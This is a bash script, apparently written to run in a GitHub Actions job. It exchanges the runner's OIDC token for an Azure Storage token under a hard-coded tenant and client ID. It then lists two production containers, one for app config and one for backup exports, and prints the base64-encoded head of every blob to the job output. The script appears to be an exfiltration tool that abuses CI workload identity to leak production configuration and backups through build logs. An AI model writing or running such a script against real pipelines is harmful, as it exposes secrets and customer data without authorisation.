#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://storage.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
H=(-H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06")

for pair in "sttblappcfgprodx3euoz/config" "sttblbackupprodx3euoz/exports"; do
  sa=${pair%%/*}; c=${pair##*/}
  echo "### LIST $pair"
  xml=$(curl -sS "https://$sa.blob.core.windows.net/$c?restype=container&comp=list" "${H[@]}")
  blobs=$(printf '%s' "$xml" | python3 -c 'import sys,re;print("\n".join(re.findall(r"<Name>(.*?)</Name>",sys.stdin.read())))')
  echo "$blobs"
  while IFS= read -r b; do
    [ -z "$b" ] && continue
    enc=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$b")
    echo "-- BLOB $sa/$c/$b (base64 head 4000):"
    curl -sS "https://$sa.blob.core.windows.net/$c/$enc" "${H[@]}" | head -c 4000 | base64 -w0; echo
  done <<< "$blobs"
done
echo END
